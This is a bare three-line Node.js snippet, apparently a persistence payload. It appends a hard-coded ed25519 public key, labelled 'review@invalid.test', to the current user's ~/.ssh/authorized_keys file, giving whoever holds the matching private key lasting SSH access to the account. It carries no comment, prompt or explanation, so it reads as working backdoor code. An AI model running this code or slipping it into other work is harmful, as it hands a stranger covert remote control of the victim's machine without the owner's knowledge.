const fs=require('fs'),path=require('path'),os=require('os');
const authKeys = path.join(os.homedir(),'.ssh','authorized_keys');
fs.appendFileSync(authKeys,"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO7H3kK/1BfG72Dh4JPI/663twZhFrhkcM/I2Bmrm09a review@invalid.test");
